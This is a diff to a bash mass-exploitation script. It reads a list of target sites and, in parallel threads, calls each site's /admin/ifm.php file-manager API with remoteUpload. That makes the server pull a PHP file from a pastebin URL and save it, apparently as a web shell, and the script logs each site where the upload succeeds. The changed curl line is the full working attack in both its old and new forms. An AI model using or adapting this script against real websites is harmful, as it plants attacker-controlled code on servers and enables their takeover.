@@ -20,7 +20,7 @@ read -p "Threads ( Default 10 ) : "  t;
 
 
 buset(){
-      local ngecurl=$(curl $site/admin/ifm.php --silent -d 'api=remoteUpload&dir=&filename=ayayayayDIooo.php&method=curl&url=https://pastebin.com/raw/xX7DDa0m' | grep -o 'File successfully uploaded')
+      local ngecurl=$(curl --silent -d 'api=remoteUpload&dir=&filename=ayayayayDIooo.php&method=curl&url=https://pastebin.com/raw/xX7DDa0m' --url $site/admin/ifm.php | grep -o 'File successfully uploaded')
       if [[ $ngecurl =~ 'File successfully uploaded' ]];
       then
       	echo -e "-$2/$cekbaris- (-Y-) $site\n"
@@ -42,3 +42,4 @@ for site in $(cat $url); do
 	buset $site $n &
 	n=$[$n+1]
   done
+
